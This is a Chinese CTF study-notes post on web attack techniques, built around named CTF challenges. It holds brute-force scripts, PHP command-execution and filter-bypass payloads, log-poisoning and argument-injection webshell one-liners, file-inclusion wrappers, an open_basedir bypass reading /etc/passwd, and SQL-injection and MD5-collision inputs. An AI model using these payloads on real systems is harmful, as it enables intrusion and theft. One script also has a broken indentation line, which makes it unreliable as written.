---
title: web知识小记(old)
id: web知识小记(old)
---

<!-- more -->



## 前言

这篇(x)长期更新，大概就是总结一下一直以来刷的web题中的一些小知识



## 信息收集

- 查看源代码：右键点击，有时会出现右键被禁用的情况：view-source:url
- F12看请求包、响应包、Cookie
- （url/editor）某编辑器editor最新版默认配置下，如果目录不存在，则会遍历服务器根目录
- 探针：eg雅黑 url/tz.php
- 开发人员在各种文档中的一些信息泄漏（账户密码？）、管理员邮件、帐号
- 真实ip、子域名、旁站
- 源码泄漏：
  常见网站源码备份名：web、www、website、backup、back、wwwroot、temp
  常见网站源码备份后缀：tar、tar.gz、zip、rar
  .git、.svn、.hg、.DS_Store、CVS
- phps：xxx.php -> xxx.phps
- mdb文件：早期asp+access构架的数据库文件，该文件泄漏相当于数据库被tuoku
-  WEB-INF/web.xml
  /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
  /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
  /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
  /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
  /WEB-INF/database.properties：数据库配置文件



## 爆破

- 子域名爆破、目录爆破

- token

- 利用得到的信息进行爆破
  比方说ctfshowweb27：
  ![](https://i.loli.net/2021/04/06/zd6Qf3qLvyog7Y4.png)可以利用姓名和身份证查询学号(录取时的查询系统)，而身份证被部分打码，这时就可以写脚本爆破（身份证是有规律的，爆破结合社工更有效率）

  ```python
  import requests
  import re
  
  url = "url/info/checkdb.php"
  usr = ['高先伊', '嵇开梦', '郎康焕', '元羿谆', '祁落兴']
  card1 = ['621022', '360730', '522601', '45102', '410927']
  card2 = ['5237', '7653', '8092', '3419', '5570']
  
  for j in range(5):
      a, b, c = usr[j], card1[j], card2[j]
      for year in range(1990, 1993):
          for mon in range(1, 13):
              for day in range(1, 32):
                  if mon == 2:
                      if year % 4 == 0 and year % 100 != 0 or year % 400 and day > 29:
                          break
                      elif day > 28:
                          break
                  elif mon in [4, 6, 9, 11] and day > 30:
                      break
                  card = b + str("%d" % year) + str("%02d" % mon) + str("%02d" % day) + c
                  payload = dict(a=a, p=card)
  					  r = requests.post(url, data=payload)
                  print(payload, r.text)
  ```

  

- tomcat认证爆破：
  1、burps抓包，利用字典爆破。（ctfshowweb21）
  ps：利用custom iterator(自定义迭代器)：Payload set ---->custom iterator
  需要进行base64编码；payload processing 进行编码设置
  取消Palyload Encoding编码 因为在进行base64加密的时候在最后可能存在 == 这样就会影响base64 加密的结果
  2、python脚本：

  ```python
  import time
  import requests
  import base64
  
  url = 'http://65efec28-322f-476e-aef1-b6cb3151a201.challenge.ctf.show:8080/'
  password = []
  with open("C:\\Users\\ls\\Desktop\\最新网站后台密码破解字典.txt", "r") as f:
      while True:
          data = f.readline()
          if data:
              password.append(data)
          else:
              break
  
  for p in password:
      strs = 'admin:' + p[:-1]
      header = {
          'Authorization': 'Basic {}'.format(base64.b64encode(strs.encode('utf-8')).decode('utf-8'))
      }
      rep = requests.get(url, headers=header)
      time.sleep(0.2)
      if rep.status_code == 200:
          print(rep.text)
          break
  ```

- mt_rand()、mt_srand(seed)：

  - mt_srand(seed)：分发seed种子，有了种子后生成随机数
    ps：php>4.2，随机数生成器自动播种，没必要使用该函数手动播种，**若设置了seed参数，则生成的随机数为伪随机数，即每次访问得到的随机数其实都是一样的**（ctfshowweb24）

    ```php
    # 重复刷新页面，得到的随机数不变；但每次调用mt_rand()得的随机数不等
    # 而mt_rand()+mt_rand()也并不简单的等于对应次数的随机数相加（比这更复杂）
    <?php
        mt_srand(37976766);
        echo mt_rand()."\n";			# 1669514551
        echo mt_rand()."\n";			# 1927304004
        echo mt_rand()+mt_rand()."\n";	# 2786133454
    ?>
    ```

  - 所谓的每次访问不是指一个脚本中重复使用mt_rand()，在同一脚本中，每次调用mt_rand()都会得到不一样的随机数，但调用顺序和其值还是一一对应且固定的。（ctfshowweb25）
    并且mt_rand()+mt_rand()也并不简单的等于对应次数的随机数相加（比这更复杂，那就难以知晓其值了）
    解决办法是https://www.openwall.com/php_mt_seed/（linux下安装）

    ```shell
    （kali下解压然后进入目录make就行）
    tar -zxvf xxx.tar.gz
    make
    ```

    


## 命令执行(基于php)

- 先是常见的命令执行两兄弟：

  - eval()：把字符串按照 PHP 代码来计算。 字符串必须是合法的 PHP 代码，且须以分号结尾
    可见其对命令实现实际是将括号包含的语句插入到自身的位置，那就可以添加各种语句进行截断：?><?、exit(0)；
  - system()：执行 指定的命令， 并输出执行结果
    成功则返回命令输出的最后一行， 失败则返回 `false`

- 一些符号

  ```php
  通配符、占位符：*、？
  当一些文件名被禁用，他们就派上用场了
  命令分割符（如;被禁用就可以用上）
  %0a、%0d    # 换行符、回车符
  |           # 第一条命令结果作为第二条命令的输入
  ||          # 第一条执行失败，执行第二条命令
  ;           # 连续指令功能。
  &           # 连接的两条命令都会执行
  &&          # 当第一条执行成功后执行后续命令
  ```
  
- 显示文件内容

  ```php
  cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev
  file_get_content()、show_source()、include()、highlight_file()
  
  假如:和括号被禁，就需要使用一些无需括号的语言结构，如：echo、print、isset、unset、include、require
  ```
  
- 一些bypass

  ```php
  空格：
  	%09
  	$IFS$9（url编码下$9为linuxshell进程的第九个参数，始终为空字符）、${IFS}
  	<>、<
  	利用输出作为输入：?a=flag.php -> ?a={ls,-l}
  黑名单：
  	通配符、占位符：*、？
  	夹杂字符：''、""、``、${x}、$1、\、
  	${}:
  	会识别包含的第一个字符，只要将第一个字符修改为如空格，tab，注释，回车就会避免被直接当成变量，而将其执行为PHP代码
  	ps:在被“”包裹时候直接${}是不可以的，因为PHP将会将它识别为可变变量而不是一个PHP代码
  利用系统变量切片构造命令：
  	如/ = ${PATH:0:1} = /bin/xxx[0]
  ```
  
- 无字母数字rce
  [无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html) 
  [无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）](https://blog.csdn.net/miuzzx/article/details/109143413)
  eg：极客大挑战2019 rce me

  > 异或生成命令![](https://i.loli.net/2021/04/21/vCOrG7lMoFH2dVa.png)
  >
  > 执行：![](https://i.loli.net/2021/04/21/hiUkTYXbFSc2Cwo.png)
  > 同理构造一句话：
  > ![](https://i.loli.net/2021/04/21/BLbCJk12NQGVmtK.png)
  > 执行如下：![](https://i.loli.net/2021/04/21/1GJSj278QlNWvcg.png)
  > 蚁剑连接，disable_function绕过一下即可
  > ![](https://i.loli.net/2021/04/21/967z2HlmZa8cTgJ.png)

- 无参数函数rce
  [php无参数函数RCE](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/)
  eg:GXYCTF禁止套娃
  执行利用变量获取flag.php，再将其显示出来

  ```php
  scandir(目录,[0|1:升|降序],[context])——列出指定路径中的文件和目录localeconv()——返回一包含本地数字及货币格式信息的数组,数组第一项是.
  current()——返回数组中的当前元素值, 默认取第一个值，别名为pos()
  array_reverse()——逆向输出数组
  array_flip()交换数组的键和值
  array_rand()从数组随机一个或多个单元，不断刷新访问就会不断随机返回
  最终payload：
  show_source(next(array_reverse(scandir(pos(localeconv())))));
  highlight_file(next(array_reverse(scandir(current(localeconv())))));
  highlight_file(array_rand(array_flip(scandir(current(localeconv())))));
  highlight_file(next(array_reverse(scandir(current(localeconv())))));
  ```
- 利用系统变量切片构造命令（黑名单绕过）

- 一些命令执行读取文件的思路

  > **嵌套eval**：
  >
  > ```php
  > eval(eval($_GET[1]);&1=phpinfo();) (这里的1逃逸出黑名单，可以任意传入)
  > ```
  >
  > **包含日志拿shell**：
  >
  > ```php
  > user_agent：<?php eval($_post[1]);?>
  > 然后include($_GET[1]);&1=/var/log/nginx/access.log
  > nginx的日志文件为/var/log/nginx/access.log
  > ```
  >
  > **利用ssrf**：
  > [php curl实现发送get和post请求](https://www.jianshu.com/p/7fab00c11770)
  >
  > ```php
  > $ch = curl_init();
  > curl_setopt($ch, CURLOPT_URL, "file:///var/www/flag.php");
  > curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  > curl_setopt($ch, CURLOPT_HEADER, 0);
  > $output = curl_exec($ch);
  > curl_close($ch);
  > print_r($output);
  > ```
  >
  > **伪协议对文件进行读写**：
  >
  > - **data://**
  >
  >  - `allow_url_fopen` ：on
  >     `allow_url_include`：on
  >    `PHP版本 >= 5.2`
  >   - 运用：`data:资源类型;编码,内容`
  >     `?xxx=data://text/plain;base64,(base64编码的内容)`或：`?xxx=data:text/plain,(url编码的内容)`
  >
  > - **php://filter**
  >
  >  参数如下：
  >
  > | **php://filter 参数**       |                                                              |
  > | --------------------------- | :----------------------------------------------------------: |
  > | 名称                        |                             描述                             |
  > | `resource=<要过滤的数据流>` |              必须。它指定了你要筛选过滤的数据流              |
  > | `read=<读链的筛选列表>`     |       可选。可以设定一个或多个过滤器名称，以管道符（`        |
  > | `write=<写链的筛选列表>`    |       可选。可以设定一个或多个过滤器名称，以管道符（`        |
  > | `<；两个链的筛选列表>`      | 任何没有以`read=`或`write=`作前缀的筛选器列表会视情况应用于读或写链 |
  >
  >   常用：
  >   base64：
  >  读文件`php://filter/read=convert.base64-encode/resource=hhh.php`
  >   写文件就把read改成write就行
  >   还有就是在进行base64编码难免生成+=,特别是?>转码后以`==`结尾，那么可以在不影响代码的情况下修改其末尾：
  >   `<?php system('tac *.php');?>aa`即可消灭`==`
  >   rot13
  >   将文件写入：`php://filter/write=string.rot13/resource=shell.php`
  >   （若事先将文件内容rot13编码，rot13二次编码后即得到原文）
  >
  > - **glob://**
  >   设计缺陷导致的任意**文件名**列出（通常只能列出根目录以及open_basedir下的文件名）
  >
  >   - scandir()+glob://
  >
  >  ```php
  >   #以下三种payload，都可以将扫描结果输出，绝对路径|相对路径都可以
  >   var_dump(scandir("glob:///*"));
  >    print_r(scandir("glob://./*"));
  >    echo json_encode(scandir("glob://../*"));
  >    #  以下是学长的碎碎念
  >    # （关键在于 scandir() + glob伪协议
  >    # （不过实际上也可以用别的方法来弄，这个涉及到CTF。。一般来说不会这么绝
  >    # （比如 opendir 吧
  >  ```
  >
  >   - DirectoryIterator+glob://
  >     DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)
  >
  >  ```php
  >   <?php 
  >     $a=new directoryiterator("glob:///*"); 
  >    foreach($a as $f) {
  >       echo($f->__tostring().' '); 
  >     } 
  >   ?>
  >     	# glob:///*	会列出根目录下的文件
  >   	# glob://*	会列出open_basedir允许目录下的文件
  >  ```
  >
  >   - opendir()+readdir()+glob://
  >
  >   ```
  >   <?php
  >  if ( $b = opendir('glob:///*') ) {
  >       while ( ($file = readdir($b)) !== false ) {
  >          echo $file."<br>";
  >       }
  >       closedir($b);
  >   ?>
  >   ```
  
  



## 文件包含

- 伪协议的运用

  - 过滤器filter://：`?file=php://filter/convert.base64-encode/resource=flag.php`
  - data://：
    某些字符串被过滤，可以使用data编码后传入
    如：php被替换为???，那么
    `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs`

- 日志文件包含getshell

  - 一些日志文件默认路径：
    nginx日志文件：`/var/log/nginx/access.log`
    apache日志文件：`/var/log/ apache | apache2 | httpd /access.log`
    iis日志文件：`%systemroot%\system32\logfiles\`
  - 在ua头写一句话，再传参包含即可

- [利用session.upload_progress进行文件包含和反序列](https://www.freebuf.com/vuls/202819.html)

  ```php
  php.ini关于session.upload的一些默认配置：
  # 表示upload_progress功能开始，意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 
  1. session.upload_progress.enabled = on	
  2. session.upload_progress.cleanup = on		# 表示上传结束后php会立即清空对应session文件中的内容
  # prefix+name将表示为session中的键名
  3. session.upload_progress.prefix = "upload_progress_"
  4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
  ```

  - session.auto_start=on，php接收请求时自动初始化session，无需session_start()
  - session.use_strict_mode=on，session_id可控，由此文件名可控：
    可通过自定义cookie如：PHPSEID=xxx，来控制php生成的临时文件名：/tmp/sess_xxx
    此时即使用户未自定义session，php也会自动将session初始化，产生一个键值写入sess_xxx文件里：
    `ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name`
  - session.upload_progress.cleanup=on，导致文件上传后session内容会自动清空，这是就要利用到条件竞争






## PHP特性

### 强|弱比较

强比较`===`：先比较类型是否相同；再比较值

弱类型比较`==`：会将字符类型转换为相同类型，在比较值
（ps：若比较数字和字符串 | 涉及数字内容的字符串；则字符串会转换为数值并按数值进行比较）

> eg：
>
> 当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内
> 该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。
>
> ```php
> var_dump("admin"==0);  //true			# admin为字符串，转换即为0
> var_dump("1admin"==1); //true			# 字符串中的数值的开始部分决定了其值
> var_dump("admin1"==1) //false			
> var_dump("admin1"==0) //true
> var_dump("0e123456"=="0e4456789"); //true # 将0e|0E识别为科学计数法；而0的n次方始终为0，故相等
> Copy
> ```

### 各种函数

#### md5()

> 利用md5($pass,true)构造万能密码sql注入
>
> - 后端查询语句：
>
>   ```sql
>   select * from 'admin' where password=md5($pass,true)
>   ```
>
> - md5(string,raw)
>   String: 必需，为要计算的字符串
>   Raw: true:-原始16字符二进制格式
>   false:-默认。32字符十六进制数
>
> - 若MD5值经hex转换为字符串后为’or’+balabala这样的字符串；那么拼接的查询语句为：
>
>  ```sql
>   select * from `admin` where password=''or'balabala'
>  ```
>
> - 当’or’后的值为true时，即可构成万能密码；在此利用到一个mysql特性：
>  `在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数`（测试时发现只要是数字都可以）
>   (ps：这种情况必须有单引号括起来
>   如`password='xxx' or '1xxxxxxxxx'`就相当于`password='xxx' or 1`；故返回值为true)
>
> - 常用payload：`ffifdyop`

> 弱类型比较bypass
>
> 利用一些MD5编码后为0e开头的字符串
>
> ```python
> 一些md5编码后得到0exxx（此处xxx为十进制字符）的字符串
> 原字符串					md5值
> QNKCDZO			0e830400451993494058024219903391
> 240610708		0e462097431906509019562988736854
> aabg7XSs		0e087386482136013740957780965295
> aabC9RqS		0e041022518165728065344349536299
> s878926199a		0e545993274517709034328855841020
> s155964671a		0e342768416822451524974117254469
> s214587387a		0e848240448830537924465865611904
> s214587387a		0e848240448830537924465865611904
> s878926199a		0e545993274517709034328855841020
> s1091221200a	0e940624217856561557816327384675
> s1885207154a	0e509367213418206700842008763514
> qebi7zl0		0e649420541288950724577306786996
> qebaur5g		0e352312259284787676841028696030
> qe20k7jl		0e416004725936696827118806457976
> qe9vwdjf		0e288029216666843876260611249898
> 
> # 补一些做题的脚本吧
> # 生成md5值为0exxx的--，还有一些套娃关卡的第一关也是要求验证码，改一下就能用了
> import hashlib
> l = 'qwertyuiopasdfghjklzxcvbnm1234567890'
> for i in l:
> for j in l:
> for k in l:
>     for m in l:
>         for n in l:
>             for o in l:
>                 for p in l:
>                     for q in l:
>                         f = i + j + k + m + n + o + p + q
>                         md5 = hashlib.md5(f.encode(encoding='UTF-8')).hexdigest()
>                         if md5[:2] == '0e' and str.isdigit(md5[2:]):
>                             print(f)
>                             print(md5)
> # 碰到的某道题 要求变量$a==md5($a) 0e215962017 
> import hashlib
> 
> for i in range(0,10**41):
> 	i='0e'+str(i)
> 	md5=hashlib.md5(i.encode()).hexdigest()
> 	if md5[:2]=='0e' and md5[2:].isdigit():
> 		print('md5:{} '.format(i))
> 		break
> 
> ```
>
> 强比较bypass
>
> 常见的：数组绕过
>
> ```php
> eg：
> (md5($id) === md5($gg) && $id !== $gg)
> 直接数组绕过：
> ?id[]=1&gg[]=2
> ```
>
> 还有最近碰到的：
>
> ```php
> (string)$_POST['a1']!==(string)$_POST['a2']&&md5($_POST['a1'])===md5($_POST['a2'])}
> # 最后转换为字符串比较，使用数组就不可行了
> # 只能使用两组MD5值相同的不同字符串了，这里可以用脚本跑，这里就直接上一组url编码过后的值：
> # 1
> a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
> b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
> # 2
> a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
> &b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
> 
> #3
> sha1()加密后得到0exxx；
> 且md5值相等的两组：
> a=aaroZmOk
> &b=aaK1STfY
> ```

#### substr()、sha1()、base64_decode

> md5()、sha1()、base64_decode()只能处理传入的字符串数据
> 当传入数组后会报出Warning错误，但仍会正常运行并返回值，当==左右两边都错误时，并且正常运行返回相同的值，就可以是判定条件成立
>
> bypass：对substr()、sha1()、base64_decode()传入数组则返回null
>
> ```php
> $a=[];
> var_dump(substr($a, 123));					//NULL
> var_dump(sha1($a));						//NULL
> # sha1后为0e数字的值：
> # aaK1STfY	0e76658526655756207688271159624026011393
> # aaO8zKZF	0e89257456677279068558073954252716165668
> var_dump(substr($a, 123) === sha1($cc));	//bool(true)
> ```

#### strcmp()

> strcmp(str1,str2)：比较两个字符串str1和str2
>
> str1<str2 返回<0
> str1>str2返回>0
> str1=str2 返回0
>
> （ps：数据类型不匹配(即传入非字符串类型)，也会返回0 （仅php<5.3））
>
> bypass：同样的，给strcmp的参数为数组也会返回null
>
> ```
> # 传入 passwd[]=xxx
> 实际是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等（某种意义上null相当于false）
> ```

#### swtich()

> 若switch的case判断类型为数值，则switch会将参数转换为int类型。
>
> ```php
> $i ="2hhh";
> switch ($i) {
> case 0:break;
> case 1:break;
> case 2:
>  echo "success,i=2";
>  break;
> case 3:
>  echo "i is 3";break;
> }
> ```
>
> [![img](https://i.loli.net/2021/03/10/KnycN41kMCS7IVx.png)](https://i.loli.net/2021/03/10/KnycN41kMCS7IVx.png)

#### is_numeric()

> is_numeric() ：判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。
>
> is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断因此输入%20password在解析变量名就会变成password
>
> bypass：
>
> ```php
> passwd=1234567%20
> 
> passwd=1234567%00
> ```

此外：在某些cms中，会利用如下代码检测用户输入

```php
# 该片段判断参数s是否为数字，是则带入数据库查询，不是则返回0
$s = is_numeric($_GET['s'])?$_GET['s']:0;
$sql="insert into test(type)values($s);";  //是 values($s) 不是values('$s')
mysql_query($sql);
```

但可以将sql语句转换为16进制传给参数

[![img](https://i.loli.net/2021/03/10/yamFEb2WUMnvKi1.jpg)](https://i.loli.net/2021/03/10/yamFEb2WUMnvKi1.jpg)



#### intval()

`intval ( mixed $value , int $base = 10 ) : int`——获取变量的整数值
value：要转换的数量值，base：转换所用进制

三个特性：

- 成功：返回var的整数值；
  失败 | 空数组：返回0；
  	非空数组：返回1

- > 如果 `base` 是 0，通过检测 `value` 的格式来决定使用的进制：
  >
  > - 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
  > - 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
  > - 将使用 10 进制 (decimal)。

- base为0，变量在遇上数字或正负符号才做转换，遇到非数字或字符串结束时以(\0)结束转换，ps：前提是进行弱类型比较

> eg1:
>
> ![](https://i.loli.net/2021/03/16/rmzM8cI3FtHa4lA.png)
> 由此可输入三种payload：
>
> - 十六进制：?num=0x117c 
> - 小数点：?num=4476.110
> - ?num=4476e1
>
> eg2:
>
> ![朴实无华](https://i.loli.net/2021/03/16/lHMVZnLrtFq9REp.png)
> Intval在处理字符串型的科学计数法时只输出e前的数字，而+1后又作为数字处理
>
> echo intval(1e10); 	=》10000000000
>
> echo intval("1e10"); 	=》1
>
> echo intval("1e10"+1); =》10000000001

#### in_array()

>`bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )`
>
>（ps：strict相当于是否开启强比较）
>不提供$strict参数(即默认为false)时，会进行松散比较，判断$needle是否在数组$haystack中
>$strict=true；还会比较$needle和$haystack中元素类型是否相同
>
>```php
>$array=[0,1,2,'3'];
>var_dump(in_array('abc', $array));  //true	# 'abc'转换为0
>var_dump(in_array('1bc', $array));  //true	# '1bc'转换为1
>
># 转换整型int/浮点型float会返回元素个数；
># 转换bool返回Array中是否有元素；
># 转换成string返回'Array'，并抛出warning
>```
>
>array_search()和in_array()类似



#### preg_match()

1. preg_match只能处理字符串，当传入数组时会返回false
2. [PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)
3. `.`不会匹配换行符；
   eg:`preg_match('/^.*(flag).*$/', $a)`可令`a="\nflag"`
   而非多行模式下，`$`会忽略末尾的`%0a`即空字符；
   eg:`preg_match('/^flag$/', $_GET['a']) && $_GET['a'] !== 'flag'`可输入`a=flag%0a`

#### preg_replace()

preg_replace() /e模式下可以执行代码：[深入研究preg_replace与代码执行](https://xz.aliyun.com/t/2557)

#### open_basedir()绕过

##### chdir()、ini_set()函数组合

利用ini_set()设置php.ini的值，在函数执行时生效，脚本结束后恢复原状。

```php
ini_set ( string $varname , string $newvalue ) : string
```

varname是需要设置的值；newvalue是设置成为新的值
成功时返回旧的值，失败时返回 FALSE

```php
payload：
ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');system(‘cat ../../../../../etc/passwd’);
```



#### glob://

glob://协议是php5.3.0以后一种查找匹配的文件路径模式，而单纯传参glob://是没办法列目录的，需要结合其他函数方法

##### scandir()+glob://

只能列出根目录以及open_basedir()允许目录下的文件

```php
<?php
var_dump(scandir('glob:///*'));
>
```



##### DirectoryIterator+glob://

DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)

```php
payloadL:
<?php
$a = new DirectoryIterator("glob:///*.txt");
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
#	glob:///*	会列出根目录下的文件
# 	glob://*	会列出open_basedir允许目录下的文件
```

##### opendir()+readdir()+glob://

同样只能列出根目录已经open_basedir()允许的目录

```php
<?php
if ( $b = opendir('glob:///*') ) {
    while ( ($file = readdir($b)) !== false ) {
        echo $file."<br>";
    }
    closedir($b);
}
?>
```



### 反序列化

可以看y4师傅的这篇 [[CTF\]PHP反序列化总结_Y4tacker的博客-CSDN博客](https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&app_version=4.11.0&code=app_1562916241&uLinkId=usr1mkqgl919blen)

#### 序列化数据的标识

> a - array 数组
> b - boolean 布尔型
> d - double 浮点型
> i - integer 整数型
> o - common object 共同对象
> r - reference 对象引用
> s - string 纯字符串
> S - string 此时字符串支持后面的字符用16进制表示
> C - custom object 自定义对象
> O - class 类
> N - null 空
> R - pointer reference 指针引用
> U - unicode string Unicode编码的字符串（php4、5不支持）
>
> 在php中，引用意为不同的名字访问同一个变量内容
>
> ```php
> 如下：
> O:5:"funny":2:{s:15:"funnypassword";N;s:6:"verify";R:2;}
> ```
>
> 关于反序列化时s的使用：s为纯字符串，S则可以使用十六进制表示字符串如
>
> \[16进制两位字符]
>
> 比如\61表示A

#### 对象字段名的序列化

（ps：php7.1以上对属性类型不敏感，构造payload时直接传入类为public也可）

private属性序列化的时候格式是 `%00类名%00成员名` | `\0类名\0成员名`

protected属性序列化的时候格式是 `%00*%00成员名` | `\0*\0成员名`

```php
如：
<?php
class test{
    private $test1="hello";		#\00test\00test1
    public $test2="hello";		#test2
    protected $test3="hello";	#\00*\00test3
}
$test = new test();
echo serialize($test);  
输出得：
O:4:"test":3:
{s:11:" test test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:" * test3";s:5:"hello";}

但真实结果为：（ps：这是因为\00为空字符，不显示在控制台中，观察s后的字符数即可发现）
O:4:"test":3:{s:11:"\00test\00test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:"\00*\00test3";s:5:"hello";}

那么在url传参时就要将\00编码为%00
```

![](https://i.loli.net/2021/03/10/9a4Ojwx8WV53qky.png)

#### 绕过_wakeup()

序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行,并且不会报错,可以被正常反序列化

如下对象属性个数为3，若将其更改为大于3即可绕过_wakeup()：

```php
O:4:"test":3:{s:11:" test test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:" * test3";s:5:"hello";}
```



### php伪协议的运用

http://na0hblog.top/



### escapeshellarg+escapeshellcmd造成的漏洞

- Escapeshellarg：把字符串转码为可以在 shell 命令里使用的参数
  Escapeshellcmd：对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义

- (该漏洞实际就是两次转义后的闭合出现了问题，没考虑到单引号
  不过现在无论哪个版本好像都被修复了。。)

> 传入的参数是：`172.17.0.2' -v -d a=1`
> **escapeshellarg**处理后：
> `'172.17.0.2'\'' -v -d a=1'`，即先对`单引号'`转义，再用单引号将左右两部分括起来从而起到连接的作用
> **escapeshellcmd**处理后：
> `'172.17.0.2'\\'' -v -d a=1\'`，这里escapeshellcmd对`\`以及`最后那个不配对儿的引号`进行了转义
>
> 最终 `'172.17.0.2'\\'' -v -d a=1\'`就相当于`172.17.0.2\ -v -d a=1'`
> 中间的`\\`被解释为`\`而不是转义字符，故`\后面的'`没有被转义，与再后面的`'`配对儿成了一个空白连接符。
> 则curl 172.17.0.2\ -v -d a=1'，即为向172.17.0.2\发起请求，POST 数据为a=1'

在给出做题时的例子：

> [BUUCTF 2018]Online Tool：
>
> (ps：nmap -oG 可将命令写入文件；命令含闭合引号无影响)
>
> 首先要明确会被\转义的符号：`\、?、<、>、(、)、[、]、;、不配对的'、''`
> 1、`传入' <?php eval($_POST["a"]);?> -oG hhh.php`
> => ` ''\'' <?php eval($_POST["a"]);?> -oG hhh.php' `
> => ` ''\'' \<\?php eval\($_POST\["a"\]\)\;\?\> -oG hhh.php \'`
> 此时文件名为`hhh.php'`
>
> 2、传入`' <?php eval($_POST["a"]);?> -oG hhh.php '`
> =>`  ''\'' <?php eval($_POST["a"]);?> -oG hhh.php '\'''`
> => ` ''\\'' \<\?php eval\($_POST\["a"\]\)\;\?\> -oG hhh.php '\\''' 	`
> （这里的'和文件名中间必须有空格，否则就会生成hhh.php\\这样的文件）
>
> 故最终payload：`' <?php eval($_POST["a"]);?> -oG hhh.php '`



## CVE

### cve-2020-7066

- 描述：在PHP版本7.2.x低于7.2.29；7.3.x低于7.3.16；7.4.x低于7.4.4，而使用get_headers（）与用户提供的网址，如果URL包含零（\0）字符，URL将被默默地截断在它。这可能会导致某些软件对get_headers的目标做出错误的假设，并可能向错误的服务器发送一些信息

- get_headers() 返回一个数组，包含有服务器响应一个 HTTP 请求所发送的标头

- 在该漏洞中get_headers() 会静默地截断它使用的URL中空字节之后的任何内容。这个在网页里可以结合SSRF使用，可以用来绕过对url尾部的检测，并且访问我们想要访问的地址，得到一些敏感的标头信息，造成信息泄露。

  > eg：[GKCTF2020]cve版签到
  >
  > 只允许访问后缀为.ctfhub.com的网页；
  >
  > ![](https://i.loli.net/2021/03/11/vUwPecRdzS1B29M.png)
  > 这时就可以构造url%00.ctfhub.com绕过检测，从而访问url
  >
  > ![127.0.0.1%00.cth.com](https://i.loli.net/2021/03/11/M6XZCi7JDdArjnI.png)
  >
  > 再根据提示访问`127.0.0.123%00.ctfhub.com`即可获取flag

  

## 一些小知识

- 等号在base64中只是起到填充的作用，不影响具体的数据内容，直接用去掉，=和带着=的base64解码出来的内容是相同的
- 在Ua中传入是不会进行解码的，因此编码绕过是无效的
  而在url中写入则会被url编码，没到达php就会被写入日志文件，同样不行

![](https://i.loli.net/2021/03/10/857Yrt69bD2keOP.png)